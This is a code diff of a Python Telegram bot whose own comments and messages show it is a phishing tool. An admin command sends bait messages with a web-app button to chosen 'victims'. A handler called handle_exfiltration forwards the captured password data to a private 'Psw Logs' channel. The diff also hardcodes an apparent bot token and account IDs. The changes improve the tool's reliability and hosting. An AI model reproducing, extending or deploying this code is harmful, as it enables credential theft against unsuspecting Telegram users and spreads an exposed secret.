@@ -4,8 +4,7 @@ import threading
 from flask import Flask
 from telebot import TeleBot, types
 
-# --- Configuration ---
-# These are retrieved from Render Environment Variables for security
+# --- Configuration (Pulled from Render Environment Variables) ---
 TOKEN = os.getenv("BOT_TOKEN", "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8699819680"))
 LOG_CHANNEL = int(os.getenv("CHANNEL_ID", "-1003817774248"))
@@ -25,22 +24,22 @@ def init_db():
 def handle_start(message):
     init_db()
     user_id = message.chat.id
-    username = f"@{message.from_user.username}" if message.from_user.username else "PrivateUser"
+    username = f"@{message.from_user.username}" if message.from_user.username else "User"
     
     with sqlite3.connect('research.db') as conn:
         conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?)", (user_id, username))
     
-    # Professional but vague greeting
-    bot.send_message(user_id, "<b>Console:</b> Secure connection established. Verifying session parameters...", parse_mode="HTML")
+    bot.send_message(user_id, "<b>Console:</b> Secure connection established. Verifying session...", parse_mode="HTML")
 
 @bot.message_handler(commands=['list'])
 def list_users(message):
     if message.from_user.id == ADMIN_ID:
+        init_db()
         with sqlite3.connect('research.db') as conn:
             users = conn.execute("SELECT * FROM users").fetchall()
         
         if not users:
-            bot.send_message(ADMIN_ID, "No victims logged yet.")
+            bot.send_message(ADMIN_ID, "Database empty. Victims must /start the bot.")
             return
             
         report = "<b>Target Database:</b>\n"
@@ -54,6 +53,10 @@ def handle_trigger(message):
         try:
             # Expected format: /trigger [ID] [ChannelName]
             parts = message.text.split(maxsplit=2)
+            if len(parts) < 2:
+                bot.send_message(ADMIN_ID, "❌ Usage: /trigger [id] [channel]")
+                return
+                
             target_id = parts
             channel_name = parts if len(parts) > 2 else "your channel"
 
@@ -72,31 +75,30 @@ def handle_trigger(message):
             )
 
             bot.send_message(target_id, bait_text, parse_mode="HTML", reply_markup=markup)
-            bot.send_message(ADMIN_ID, f"✅ Trigger sent to {target_id} regarding {channel_name}")
+            bot.send_message(ADMIN_ID, f"✅ Trigger sent to {target_id}")
         except Exception as e:
-            bot.send_message(ADMIN_ID, f"❌ Usage: /trigger [id] [channel]\nError: {e}")
+            bot.send_message(ADMIN_ID, f"❌ Error: {e}")
 
 @bot.message_handler(content_types=['web_app_data'])
 def handle_exfiltration(message):
-    # This captures your format: pwsd%abc%xyz§VERIFY:pass%1256
+    # Captures the format: pwsd%abc%xyz§VERIFY:pass%1256
     raw_data = message.web_app_data.data
-    
-    # Forward the captured data to your Psw Logs channel
-    log_text = f"📥 <b>NEW LOG RECEIVED:</b>\n<code>{raw_data}</code>"
-    bot.send_message(LOG_CHANNEL, log_text, parse_mode="HTML")
+    bot.send_message(LOG_CHANNEL, f"📥 <b>NEW LOG RECEIVED:</b>\n<code>{raw_data}</code>", parse_mode="HTML")
 
-# --- Flask Server for Keep-Alive ---
+# --- Flask Server for Keep-Alive (Fix for Cron-job) ---
 @app.route('/')
 def index():
-    return "Bot is running...", 200
+    # Returning a tiny string avoids the "Output too large" error on Cron-job.org
+    return "OK", 200
 
 def run_bot():
     bot.infinity_polling()
 
 if __name__ == "__main__":
     init_db()
-    # Start bot in a background thread
-    threading.Thread(target=run_bot).start()
-    # Start Flask server
+    # Run the bot in a background thread so the Flask server can handle pings
+    threading.Thread(target=run_bot, daemon=True).start()
+    
+    # Run Flask on the port Render provides
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
